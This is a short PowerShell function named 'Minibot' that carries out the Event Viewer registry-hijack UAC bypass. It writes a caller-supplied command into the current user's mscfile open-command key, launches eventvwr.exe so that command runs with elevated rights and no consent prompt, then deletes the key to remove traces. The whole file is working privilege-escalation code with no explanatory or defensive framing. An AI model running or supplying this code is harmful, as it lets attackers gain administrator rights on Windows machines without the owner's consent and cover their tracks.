function Minibot {

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $C
    )
    
        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"   
        New-Item $mscCommandPath -Force | New-ItemProperty -Name '(Default)' -Value $C -PropertyType string -Force | Out-Null
        eventvwr.exe
	      sleep 5
	      $registro = "HKCU:\Software\Classes\mscfile"
        Remove-Item $registro -Recurse -Force
     }
